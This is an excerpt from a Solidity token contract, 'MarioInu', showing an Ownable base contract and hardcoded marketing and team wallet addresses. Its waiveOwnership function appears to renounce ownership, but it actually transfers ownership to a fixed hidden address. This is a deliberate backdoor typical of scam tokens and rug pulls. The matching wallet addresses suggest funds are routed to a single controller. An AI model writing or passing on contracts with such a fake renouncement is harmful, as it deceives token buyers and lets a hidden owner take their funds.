...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x8F97bEa866b4889C05F4Ca93275b45eb2C559996));
        _owner = address(0x8F97bEa866b4889C05F4Ca93275b45eb2C559996);
    }
...
contract MarioInu is Context, IERC20, Ownable {
    ...
    string private _name = "MarioInu";
    string private _symbol = "Marion";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x88C483dffd158210DFa17a506d4d5F1d332388ed);
    address payable public teamWalletAddress = payable(0x88C483dffd158210DFa17a506d4d5F1d332388ed);
